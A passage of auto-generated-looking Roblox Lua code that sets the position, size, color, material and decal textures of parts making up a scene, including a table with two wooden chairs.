        Part59.CFrame = CFrame.new(51.1999893, 11855.665, 1.31001937, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part59.Orientation = Vector3.new(0, 90, 0)
        Part59.Position = Vector3.new(51.199989318847656, 11855.6650390625, 1.3100193738937378)
        Part59.Rotation = Vector3.new(0, 90, 0)
        Part59.Size = Vector3.new(7.579999923706055, 3.4300003051757812, 3.4000003337860107)
        Part59.Anchored = true
        Part59.BottomSurface = Enum.SurfaceType.Smooth
        Part59.Material = Enum.Material.Fabric
        Part59.TopSurface = Enum.SurfaceType.Smooth
        Decal60.Parent = Part59
        Decal60.Texture = "http://www.roblox.com/asset/?id=62967748"
        Decal61.Parent = Part59
        Decal61.Texture = "http://www.roblox.com/asset/?id=62967724"
        Decal61.Face = Enum.NormalId.Back
        Decal62.Parent = Part59
        Decal62.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal62.Face = Enum.NormalId.Left
        Decal63.Parent = Part59
        Decal63.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal63.Face = Enum.NormalId.Right
        Decal64.Parent = Part59
        Decal64.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal64.Face = Enum.NormalId.Bottom
        Decal65.Parent = Part59
        Decal65.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal65.Face = Enum.NormalId.Top
        Part66.Parent = Model0
        Part66.CFrame = CFrame.new(37.3499947, 11856.6006, -4.90001869, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part66.Position = Vector3.new(37.34999465942383, 11856.6005859375, -4.900018692016602)
        Part66.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part66.Size = Vector3.new(9.69999885559082, 0.09999996423721313, 21.799999237060547)
        Part66.Anchored = true
        Part66.BottomSurface = Enum.SurfaceType.Smooth
        Part66.BrickColor = BrickColor.new("Really black")
        Part66.Material = Enum.Material.SmoothPlastic
        Part66.TopSurface = Enum.SurfaceType.Smooth
        Part66.brickColor = BrickColor.new("Really black")
        Part67.Parent = Model0
        Part67.CFrame = CFrame.new(51.1999893, 11859.4658, 9.21001053, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part67.Orientation = Vector3.new(0, 90, 0)
        Part67.Position = Vector3.new(51.199989318847656, 11859.4658203125, 9.210010528564453)
        Part67.Rotation = Vector3.new(0, 90, 0)
        Part67.Size = Vector3.new(7.579999923706055, 3.4300003051757812, 3.4000003337860107)
        Part67.Anchored = true
        Part67.BottomSurface = Enum.SurfaceType.Smooth
        Part67.Material = Enum.Material.Fabric
        Part67.TopSurface = Enum.SurfaceType.Smooth
        Decal68.Parent = Part67
        Decal68.Texture = "http://www.roblox.com/asset/?id=62967748"
        Decal69.Parent = Part67
        Decal69.Texture = "http://www.roblox.com/asset/?id=62967724"
        Decal69.Face = Enum.NormalId.Back
        Decal70.Parent = Part67
        Decal70.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal70.Face = Enum.NormalId.Left
        Decal71.Parent = Part67
        Decal71.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal71.Face = Enum.NormalId.Right
        Decal72.Parent = Part67
        Decal72.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal72.Face = Enum.NormalId.Bottom
        Decal73.Parent = Part67
        Decal73.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal73.Face = Enum.NormalId.Top
        Part74.Parent = Model0
        Part74.CFrame = CFrame.new(51.1999893, 11855.665, 9.21001053, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part74.Orientation = Vector3.new(0, 90, 0)
        Part74.Position = Vector3.new(51.199989318847656, 11855.6650390625, 9.210010528564453)
        Part74.Rotation = Vector3.new(0, 90, 0)
        Part74.Size = Vector3.new(7.579999923706055, 3.4300003051757812, 3.4000003337860107)
        Part74.Anchored = true
        Part74.BottomSurface = Enum.SurfaceType.Smooth
        Part74.Material = Enum.Material.Fabric
        Part74.TopSurface = Enum.SurfaceType.Smooth
        Decal75.Parent = Part74
        Decal75.Texture = "http://www.roblox.com/asset/?id=62967748"
        Decal76.Parent = Part74
        Decal76.Texture = "http://www.roblox.com/asset/?id=62967724"
        Decal76.Face = Enum.NormalId.Back
        Decal77.Parent = Part74
        Decal77.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal77.Face = Enum.NormalId.Left
        Decal78.Parent = Part74
        Decal78.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal78.Face = Enum.NormalId.Right
        Decal79.Parent = Part74
        Decal79.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal79.Face = Enum.NormalId.Bottom
        Decal80.Parent = Part74
        Decal80.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal80.Face = Enum.NormalId.Top
        Part81.Parent = Model0
        Part81.CFrame = CFrame.new(27.5999928, 11855.9502, -28.0999928, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part81.Orientation = Vector3.new(0, 90, 0)
        Part81.Position = Vector3.new(27.599992752075195, 11855.9501953125, -28.099992752075195)
        Part81.Rotation = Vector3.new(0, 90, 0)
        Part81.Size = Vector3.new(4, 4, 4)
        Part81.Anchored = true
        Part81.BottomSurface = Enum.SurfaceType.Smooth
        Part81.TopSurface = Enum.SurfaceType.Smooth
        Decal82.Parent = Part81
        Decal82.Texture = "http://www.roblox.com/asset/?id=151920525"
        Decal83.Parent = Part81
        Decal83.Texture = "http://www.roblox.com/asset/?id=62971750"
        Decal83.Face = Enum.NormalId.Bottom
        Decal84.Parent = Part81
        Decal84.Texture = "http://www.roblox.com/asset/?id=151920525"
        Decal84.Face = Enum.NormalId.Back
        Decal85.Parent = Part81
        Decal85.Texture = "http://www.roblox.com/asset/?id=62971750"
        Decal85.Face = Enum.NormalId.Top
        Decal86.Parent = Part81
        Decal86.Texture = "http://www.roblox.com/asset/?id=133252646"
        Decal86.Face = Enum.NormalId.Left
        Decal87.Parent = Part81
        Decal87.Texture = "http://www.roblox.com/asset/?id=151920525"
        Decal87.Face = Enum.NormalId.Right
        Part88.Parent = Model0
        Part88.CFrame = CFrame.new(31.5999908, 11855.9502, -28.0999928, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part88.Orientation = Vector3.new(0, 90, 0)
        Part88.Position = Vector3.new(31.599990844726562, 11855.9501953125, -28.099992752075195)
        Part88.Rotation = Vector3.new(0, 90, 0)
        Part88.Size = Vector3.new(4, 4, 4)
        Part88.Anchored = true
        Part88.BottomSurface = Enum.SurfaceType.Smooth
        Part88.TopSurface = Enum.SurfaceType.Smooth
        Decal89.Parent = Part88
        Decal89.Texture = "http://www.roblox.com/asset/?id=151920525"
        Decal90.Parent = Part88
        Decal90.Texture = "http://www.roblox.com/asset/?id=62971750"
        Decal90.Face = Enum.NormalId.Bottom
        Decal91.Parent = Part88
        Decal91.Texture = "http://www.roblox.com/asset/?id=151920525"
        Decal91.Face = Enum.NormalId.Back
        Decal92.Parent = Part88
        Decal92.Texture = "http://www.roblox.com/asset/?id=62971750"
        Decal92.Face = Enum.NormalId.Top
        Decal93.Parent = Part88
        Decal93.Texture = "http://www.roblox.com/asset/?id=133252646"
        Decal93.Face = Enum.NormalId.Left
        Decal94.Parent = Part88
        Decal94.Texture = "http://www.roblox.com/asset/?id=151920525"
        Decal94.Face = Enum.NormalId.Right
        Model95.Name = "Table"
        Model95.Parent = Model0
        Model96.Name = "Chair"
        Model96.Parent = Model95
        Part97.Parent = Model96
        Part97.CFrame = CFrame.new(8.20001221, 11854.6504, -28.6999207, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part97.Position = Vector3.new(8.20001220703125, 11854.650390625, -28.699920654296875)
        Part97.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part97.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part97.Anchored = true
        Part97.BottomSurface = Enum.SurfaceType.Smooth
        Part97.BrickColor = BrickColor.new("Reddish brown")
        Part97.Material = Enum.Material.Wood
        Part97.TopSurface = Enum.SurfaceType.Smooth
        Part97.brickColor = BrickColor.new("Reddish brown")
        Seat98.Parent = Model96
        Seat98.CFrame = CFrame.new(9.30000401, 11855.4502, -27.5999622, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Seat98.Orientation = Vector3.new(0, 90, 0)
        Seat98.Position = Vector3.new(9.300004005432129, 11855.4501953125, -27.59996223449707)
        Seat98.Rotation = Vector3.new(0, 90, 0)
        Seat98.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Seat98.Transparency = 1
        Seat98.Size = Vector3.new(1, 0.20000000298023224, 1)
        Seat98.Anchored = true
        Seat98.BottomSurface = Enum.SurfaceType.Smooth
        Seat98.BrickColor = BrickColor.new("Reddish brown")
        Seat98.Material = Enum.Material.Wood
        Seat98.TopSurface = Enum.SurfaceType.Smooth
        Seat98.brickColor = BrickColor.new("Reddish brown")
        Part99.Parent = Model96
        Part99.CFrame = CFrame.new(10.3999929, 11855.8506, -27.5999622, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part99.Position = Vector3.new(10.399992942810059, 11855.8505859375, -27.59996223449707)
        Part99.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part99.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part99.Anchored = true
        Part99.BottomSurface = Enum.SurfaceType.Smooth
        Part99.BrickColor = BrickColor.new("Reddish brown")
        Part99.Material = Enum.Material.Wood
        Part99.TopSurface = Enum.SurfaceType.Smooth
        Part99.brickColor = BrickColor.new("Reddish brown")
        Part100.Parent = Model96
        Part100.CFrame = CFrame.new(10.3999929, 11857.0498, -27.5999622, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part100.Position = Vector3.new(10.399992942810059, 11857.0498046875, -27.59996223449707)
        Part100.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part100.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part100.Anchored = true
        Part100.BottomSurface = Enum.SurfaceType.Smooth
        Part100.BrickColor = BrickColor.new("Reddish brown")
        Part100.Material = Enum.Material.Wood
        Part100.TopSurface = Enum.SurfaceType.Smooth
        Part100.brickColor = BrickColor.new("Reddish brown")
        Part101.Parent = Model96
        Part101.CFrame = CFrame.new(10.3999929, 11856.6504, -27.5999622, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part101.Position = Vector3.new(10.399992942810059, 11856.650390625, -27.59996223449707)
        Part101.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part101.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part101.Anchored = true
        Part101.BottomSurface = Enum.SurfaceType.Smooth
        Part101.BrickColor = BrickColor.new("Reddish brown")
        Part101.Material = Enum.Material.Wood
        Part101.TopSurface = Enum.SurfaceType.Smooth
        Part101.brickColor = BrickColor.new("Reddish brown")
        Part102.Parent = Model96
        Part102.CFrame = CFrame.new(10.3999929, 11857.4502, -27.5999622, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part102.Position = Vector3.new(10.399992942810059, 11857.4501953125, -27.59996223449707)
        Part102.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part102.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part102.Anchored = true
        Part102.BottomSurface = Enum.SurfaceType.Smooth
        Part102.BrickColor = BrickColor.new("Reddish brown")
        Part102.Material = Enum.Material.Wood
        Part102.TopSurface = Enum.SurfaceType.Smooth
        Part102.brickColor = BrickColor.new("Reddish brown")
        Part103.Parent = Model96
        Part103.CFrame = CFrame.new(10.3999929, 11857.8506, -27.5999622, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part103.Position = Vector3.new(10.399992942810059, 11857.8505859375, -27.59996223449707)
        Part103.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part103.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part103.Anchored = true
        Part103.BottomSurface = Enum.SurfaceType.Smooth
        Part103.BrickColor = BrickColor.new("Reddish brown")
        Part103.Material = Enum.Material.Wood
        Part103.TopSurface = Enum.SurfaceType.Smooth
        Part103.brickColor = BrickColor.new("Reddish brown")
        Part104.Parent = Model96
        Part104.CFrame = CFrame.new(10.399991, 11856.751, -28.6999187, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part104.Position = Vector3.new(10.399991035461426, 11856.7509765625, -28.699918746948242)
        Part104.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part104.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part104.Anchored = true
        Part104.BottomSurface = Enum.SurfaceType.Smooth
        Part104.BrickColor = BrickColor.new("Reddish brown")
        Part104.Material = Enum.Material.Wood
        Part104.TopSurface = Enum.SurfaceType.Smooth
        Part104.brickColor = BrickColor.new("Reddish brown")
        Part105.Parent = Model96
        Part105.CFrame = CFrame.new(10.3999929, 11856.751, -26.4999905, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part105.Position = Vector3.new(10.399992942810059, 11856.7509765625, -26.499990463256836)
        Part105.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part105.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part105.Anchored = true
        Part105.BottomSurface = Enum.SurfaceType.Smooth
        Part105.BrickColor = BrickColor.new("Reddish brown")
        Part105.Material = Enum.Material.Wood
        Part105.TopSurface = Enum.SurfaceType.Smooth
        Part105.brickColor = BrickColor.new("Reddish brown")
        Part106.Parent = Model96
        Part106.CFrame = CFrame.new(10.399991, 11854.6504, -28.6999187, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part106.Position = Vector3.new(10.399991035461426, 11854.650390625, -28.699918746948242)
        Part106.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part106.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part106.Anchored = true
        Part106.BottomSurface = Enum.SurfaceType.Smooth
        Part106.BrickColor = BrickColor.new("Reddish brown")
        Part106.Material = Enum.Material.Wood
        Part106.TopSurface = Enum.SurfaceType.Smooth
        Part106.brickColor = BrickColor.new("Reddish brown")
        Part107.Parent = Model96
        Part107.CFrame = CFrame.new(10.3999929, 11856.251, -27.5999622, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part107.Position = Vector3.new(10.399992942810059, 11856.2509765625, -27.59996223449707)
        Part107.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part107.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part107.Anchored = true
        Part107.BottomSurface = Enum.SurfaceType.Smooth
        Part107.BrickColor = BrickColor.new("Reddish brown")
        Part107.Material = Enum.Material.Wood
        Part107.TopSurface = Enum.SurfaceType.Smooth
        Part107.brickColor = BrickColor.new("Reddish brown")
        Part108.Parent = Model96
        Part108.CFrame = CFrame.new(8.20001411, 11854.6504, -26.4999924, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part108.Position = Vector3.new(8.200014114379883, 11854.650390625, -26.49999237060547)
        Part108.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part108.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part108.Anchored = true
        Part108.BottomSurface = Enum.SurfaceType.Smooth
        Part108.BrickColor = BrickColor.new("Reddish brown")
        Part108.Material = Enum.Material.Wood
        Part108.TopSurface = Enum.SurfaceType.Smooth
        Part108.brickColor = BrickColor.new("Reddish brown")
        Part109.Parent = Model96
        Part109.CFrame = CFrame.new(9.30000401, 11855.4502, -27.5999622, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part109.Position = Vector3.new(9.300004005432129, 11855.4501953125, -27.59996223449707)
        Part109.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part109.Size = Vector3.new(2.4000000953674316, 0.20000004768371582, 2.4000000953674316)
        Part109.Anchored = true
        Part109.BottomSurface = Enum.SurfaceType.Smooth
        Part109.BrickColor = BrickColor.new("Reddish brown")
        Part109.Material = Enum.Material.Wood
        Part109.TopSurface = Enum.SurfaceType.Smooth
        Part109.brickColor = BrickColor.new("Reddish brown")
        Part110.Parent = Model96
        Part110.CFrame = CFrame.new(10.3999929, 11854.6504, -26.4999905, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part110.Position = Vector3.new(10.399992942810059, 11854.650390625, -26.499990463256836)
        Part110.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part110.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part110.Anchored = true
        Part110.BottomSurface = Enum.SurfaceType.Smooth
        Part110.BrickColor = BrickColor.new("Reddish brown")
        Part110.Material = Enum.Material.Wood
        Part110.TopSurface = Enum.SurfaceType.Smooth
        Part110.brickColor = BrickColor.new("Reddish brown")
        Model111.Name = "Table"
        Model111.Parent = Model95
        Part112.Parent = Model111
        Part112.CFrame = CFrame.new(7.6000309, 11855.1504, -28.6999226, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part112.Position = Vector3.new(7.600030899047852, 11855.150390625, -28.699922561645508)
        Part112.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part112.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part112.Anchored = true
        Part112.BottomSurface = Enum.SurfaceType.Smooth
        Part112.BrickColor = BrickColor.new("Reddish brown")
        Part112.Material = Enum.Material.Wood
        Part112.TopSurface = Enum.SurfaceType.Smooth
        Part112.brickColor = BrickColor.new("Reddish brown")
        Part113.Parent = Model111
        Part113.CFrame = CFrame.new(4.60007524, 11855.1504, -28.6999264, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part113.Position = Vector3.new(4.6000752449035645, 11855.150390625, -28.699926376342773)
        Part113.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part113.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part113.Anchored = true
        Part113.BottomSurface = Enum.SurfaceType.Smooth
        Part113.BrickColor = BrickColor.new("Reddish brown")
        Part113.Material = Enum.Material.Wood
        Part113.TopSurface = Enum.SurfaceType.Smooth
        Part113.brickColor = BrickColor.new("Reddish brown")
        Part114.Parent = Model111
        Part114.CFrame = CFrame.new(7.60003233, 11855.1504, -26.4999943, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part114.Position = Vector3.new(7.600032329559326, 11855.150390625, -26.4999942779541)
        Part114.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part114.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part114.Anchored = true
        Part114.BottomSurface = Enum.SurfaceType.Smooth
        Part114.BrickColor = BrickColor.new("Reddish brown")
        Part114.Material = Enum.Material.Wood
        Part114.TopSurface = Enum.SurfaceType.Smooth
        Part114.brickColor = BrickColor.new("Reddish brown")
        Part115.Parent = Model111
        Part115.CFrame = CFrame.new(4.60007763, 11855.1504, -26.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part115.Position = Vector3.new(4.6000776290893555, 11855.150390625, -26.5)
        Part115.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part115.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part115.Anchored = true
        Part115.BottomSurface = Enum.SurfaceType.Smooth
        Part115.BrickColor = BrickColor.new("Reddish brown")
        Part115.Material = Enum.Material.Wood
        Part115.TopSurface = Enum.SurfaceType.Smooth
        Part115.brickColor = BrickColor.new("Reddish brown")
        Part116.Parent = Model111
        Part116.CFrame = CFrame.new(6.10005474, 11856.6504, -27.599966, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part116.Position = Vector3.new(6.100054740905762, 11856.650390625, -27.599966049194336)
        Part116.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part116.Size = Vector3.new(3.200000047683716, 0.5999999046325684, 2.4000000953674316)
        Part116.Anchored = true
        Part116.BottomSurface = Enum.SurfaceType.Smooth
        Part116.BrickColor = BrickColor.new("Reddish brown")
        Part116.Material = Enum.Material.Wood
        Part116.TopSurface = Enum.SurfaceType.Smooth
        Part116.brickColor = BrickColor.new("Reddish brown")
        Model117.Name = "Chair"
        Model117.Parent = Model95
        Part118.Parent = Model117
        Part118.CFrame = CFrame.new(4.00009632, 11854.6504, -26.4999981, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part118.Orientation = Vector3.new(0, 180, 0)
        Part118.Position = Vector3.new(4.000096321105957, 11854.650390625, -26.499998092651367)
        Part118.Rotation = Vector3.new(-180, 0, -180)
        Part118.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part118.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part118.Anchored = true
        Part118.BottomSurface = Enum.SurfaceType.Smooth
        Part118.BrickColor = BrickColor.new("Reddish brown")
        Part118.Material = Enum.Material.Wood
        Part118.TopSurface = Enum.SurfaceType.Smooth
        Part118.brickColor = BrickColor.new("Reddish brown")
        Seat119.Parent = Model117
        Seat119.CFrame = CFrame.new(2.90010643, 11855.4502, -27.5999718, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Seat119.Orientation = Vector3.new(0, -90, 0)
        Seat119.Position = Vector3.new(2.900106430053711, 11855.4501953125, -27.599971771240234)
        Seat119.Rotation = Vector3.new(0, -90, 0)
        Seat119.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Seat119.Transparency = 1
        Seat119.Size = Vector3.new(1, 0.20000000298023224, 1)
        Seat119.Anchored = true
        Seat119.BottomSurface = Enum.SurfaceType.Smooth
        Seat119.BrickColor = BrickColor.new("Reddish brown")
        Seat119.Material = Enum.Material.Wood
        Seat119.TopSurface = Enum.SurfaceType.Smooth
        Seat119.brickColor = BrickColor.new("Reddish brown")
        Part120.Parent = Model117
        Part120.CFrame = CFrame.new(1.80011797, 11855.8506, -27.5999737, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part120.Orientation = Vector3.new(0, 180, 0)
        Part120.Position = Vector3.new(1.8001179695129395, 11855.8505859375, -27.599973678588867)
        Part120.Rotation = Vector3.new(-180, 0, -180)
        Part120.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part120.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part120.Anchored = true
        Part120.BottomSurface = Enum.SurfaceType.Smooth
        Part120.BrickColor = BrickColor.new("Reddish brown")
        Part120.Material = Enum.Material.Wood
        Part120.TopSurface = Enum.SurfaceType.Smooth
        Part120.brickColor = BrickColor.new("Reddish brown")
        Part121.Parent = Model117
        Part121.CFrame = CFrame.new(1.80011797, 11857.0498, -27.5999737, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part121.Orientation = Vector3.new(0, 180, 0)
        Part121.Position = Vector3.new(1.8001179695129395, 11857.0498046875, -27.599973678588867)
        Part121.Rotation = Vector3.new(-180, 0, -180)
        Part121.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part121.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part121.Anchored = true
        Part121.BottomSurface = Enum.SurfaceType.Smooth
        Part121.BrickColor = BrickColor.new("Reddish brown")
        Part121.Material = Enum.Material.Wood
        Part121.TopSurface = Enum.SurfaceType.Smooth
        Part121.brickColor = BrickColor.new("Reddish brown")
        Part122.Parent = Model117
        Part122.CFrame = CFrame.new(1.80011797, 11856.6504, -27.5999737, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part122.Orientation = Vector3.new(0, 180, 0)
        Part122.Position = Vector3.new(1.8001179695129395, 11856.650390625, -27.599973678588867)
        Part122.Rotation = Vector3.new(-180, 0, -180)
        Part122.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part122.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part122.Anchored = true
        Part122.BottomSurface = Enum.SurfaceType.Smooth
        Part122.BrickColor = BrickColor.new("Reddish brown")
        Part122.Material = Enum.Material.Wood
        Part122.TopSurface = Enum.SurfaceType.Smooth
        Part122.brickColor = BrickColor.new("Reddish brown")
        Part123.Parent = Model117
        Part123.CFrame = CFrame.new(1.80011797, 11857.4502, -27.5999737, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part123.Orientation = Vector3.new(0, 180, 0)
        Part123.Position = Vector3.new(1.8001179695129395, 11857.4501953125, -27.599973678588867)
        Part123.Rotation = Vector3.new(-180, 0, -180)
        Part123.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part123.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part123.Anchored = true
        Part123.BottomSurface = Enum.SurfaceType.Smooth
        Part123.BrickColor = BrickColor.new("Reddish brown")
        Part123.Material = Enum.Material.Wood
        Part123.TopSurface = Enum.SurfaceType.Smooth
        Part123.brickColor = BrickColor.new("Reddish brown")
        Part124.Parent = Model117
        Part124.CFrame = CFrame.new(1.80011797, 11857.8506, -27.5999737, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part124.Orientation = Vector3.new(0, 180, 0)
        Part124.Position = Vector3.new(1.8001179695129395, 11857.8505859375, -27.599973678588867)
        Part124.Rotation = Vector3.new(-180, 0, -180)
        Part124.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part124.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part124.Anchored = true
        Part124.BottomSurface = Enum.SurfaceType.Smooth
        Part124.BrickColor = BrickColor.new("Reddish brown")
        Part124.Material = Enum.Material.Wood
        Part124.TopSurface = Enum.SurfaceType.Smooth
        Part124.brickColor = BrickColor.new("Reddish brown")
        Part125.Parent = Model117
        Part125.CFrame = CFrame.new(1.80011654, 11856.751, -26.5, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part125.Orientation = Vector3.new(0, 180, 0)
        Part125.Position = Vector3.new(1.8001165390014648, 11856.7509765625, -26.5)
        Part125.Rotation = Vector3.new(-180, 0, -180)
        Part125.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part125.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part125.Anchored = true
        Part125.BottomSurface = Enum.SurfaceType.Smooth
        Part125.BrickColor = BrickColor.new("Reddish brown")
        Part125.Material = Enum.Material.Wood
        Part125.TopSurface = Enum.SurfaceType.Smooth
        Part125.brickColor = BrickColor.new("Reddish brown")
        Part126.Parent = Model117
        Part126.CFrame = CFrame.new(1.80011511, 11856.751, -28.6999321, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part126.Orientation = Vector3.new(0, 180, 0)
        Part126.Position = Vector3.new(1.8001151084899902, 11856.7509765625, -28.699932098388672)
        Part126.Rotation = Vector3.new(-180, 0, -180)
        Part126.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part126.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part126.Anchored = true
        Part126.BottomSurface = Enum.SurfaceType.Smooth
        Part126.BrickColor = BrickColor.new("Reddish brown")
        Part126.Material = Enum.Material.Wood
        Part126.TopSurface = Enum.SurfaceType.Smooth
        Part126.brickColor = BrickColor.new("Reddish brown")
        Part127.Parent = Model117
        Part127.CFrame = CFrame.new(1.80011654, 11854.6504, -26.5, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part127.Orientation = Vector3.new(0, 180, 0)
        Part127.Position = Vector3.new(1.8001165390014648, 11854.650390625, -26.5)
        Part127.Rotation = Vector3.new(-180, 0, -180)
        Part127.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part127.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part127.Anchored = true
        Part127.BottomSurface = Enum.SurfaceType.Smooth
        Part127.BrickColor = BrickColor.new("Reddish brown")
        Part127.Material = Enum.Material.Wood
        Part127.TopSurface = Enum.SurfaceType.Smooth
        Part127.brickColor = BrickColor.new("Reddish brown")
        Part128.Parent = Model117
        Part128.CFrame = CFrame.new(1.80011797, 11856.251, -27.5999737, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part128.Orientation = Vector3.new(0, 180, 0)
        Part128.Position = Vector3.new(1.8001179695129395, 11856.2509765625, -27.599973678588867)
        Part128.Rotation = Vector3.new(-180, 0, -180)
        Part128.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part128.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part128.Anchored = true
        Part128.BottomSurface = Enum.SurfaceType.Smooth
        Part128.BrickColor = BrickColor.new("Reddish brown")
        Part128.Material = Enum.Material.Wood
        Part128.TopSurface = Enum.SurfaceType.Smooth
        Part128.brickColor = BrickColor.new("Reddish brown")
        Part129.Parent = Model117
        Part129.CFrame = CFrame.new(4.00009394, 11854.6504, -28.6999264, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part129.Orientation = Vector3.new(0, 180, 0)
        Part129.Position = Vector3.new(4.000093936920166, 11854.650390625, -28.699926376342773)
        Part129.Rotation = Vector3.new(-180, 0, -180)
        Part129.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part129.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part129.Anchored = true
        Part129.BottomSurface = Enum.SurfaceType.Smooth
        Part129.BrickColor = BrickColor.new("Reddish brown")
        Part129.Material = Enum.Material.Wood
        Part129.TopSurface = Enum.SurfaceType.Smooth
        Part129.brickColor = BrickColor.new("Reddish brown")
        Part130.Parent = Model117
        Part130.CFrame = CFrame.new(2.90010643, 11855.4502, -27.5999718, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part130.Orientation = Vector3.new(0, 180, 0)
        Part130.Position = Vector3.new(2.900106430053711, 11855.4501953125, -27.599971771240234)
        Part130.Rotation = Vector3.new(-180, 0, -180)
        Part130.Color = Color3.new(0.411765, 0.25098, 0.156863)
